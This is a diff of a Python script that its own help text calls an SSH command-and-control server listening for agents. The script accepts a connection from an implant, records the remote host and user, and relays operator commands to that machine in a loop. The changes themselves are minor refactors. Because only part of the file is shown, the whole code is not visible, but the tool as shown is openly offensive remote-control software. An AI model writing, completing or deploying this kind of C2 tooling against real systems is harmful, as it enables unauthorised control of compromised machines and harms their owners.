@@ -1,15 +1,11 @@
-import sys
 import paramiko
-import os
 import socket
 import argparse
 import time
 
 parser = argparse.ArgumentParser(description="SSH C2 server configuration to listen for agents")
 parser._action_groups.pop()
-#required = parser.add_argument_group("Required")
 optional = parser.add_argument_group("Optional")
-#required.add_argument("-f", dest="key_file", help="Key File")
 optional.add_argument("-p", dest="port", type=int, default=2222, help="Port to listen (Default: 2222)")
 optional.add_argument("-u", dest="user", default="sshUser", help="Server user (Default: sshUser)")
 optional.add_argument("-pwd", dest="password", default="sshPass", help="Server password (Default: sshPass)")
@@ -29,7 +25,6 @@ class SSHServer (paramiko.ServerInterface):
 def main():
     server = "0.0.0.0" #To listen on all interfaces
     port = args.port
-    #HOSTKEY = paramiko.RSAKey(filename=os.path.join(args.key_file))
     HOSTKEY = paramiko.RSAKey.generate(2048)
 
     try:
@@ -37,10 +32,10 @@ def main():
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind((server, port))
         sock.listen()
-        print("[*] Listening for connections...")
+        print(f"[+] Port: {port} | User: {args.user} | Password: {args.password}\n[*] Listening for connections...")
         client, addr = sock.accept()
     except KeyboardInterrupt:
-        sys.exit()
+        exit()
 
     C2_Session = paramiko.Transport(client)
     C2_Session.add_server_key(HOSTKEY)
@@ -50,7 +45,7 @@ def main():
     print("\n[*] Debug info:\n" + str(conn)) #Debug info
     if conn is None:
         print("[!] Failled authentication.")
-        sys.exit()
+        exit()
     success_msg = conn.recv(1024).decode()
     host = success_msg.split(",")[0]
     user = success_msg.split(",")[1]
@@ -69,7 +64,7 @@ def main():
                         comm_handler()
                     case "!exit":
                         conn.send(command)
-                        sys.exit()
+                        exit()
                     case _:
                         conn.send(command)
                         incoming()
@@ -77,8 +72,8 @@ def main():
                 print(str(ex))
                 pass
             except KeyboardInterrupt:
-                conn.send("exit")
-                sys.exit()
+                conn.send("!exit")
+                exit()
     
     def incoming():
         try:
@@ -96,7 +91,4 @@ def main():
     comm_handler()
 
 if __name__ == "__main__":
-    try:
-        main()
-    except Exception as ex:
-        print(str(ex))
+    main()
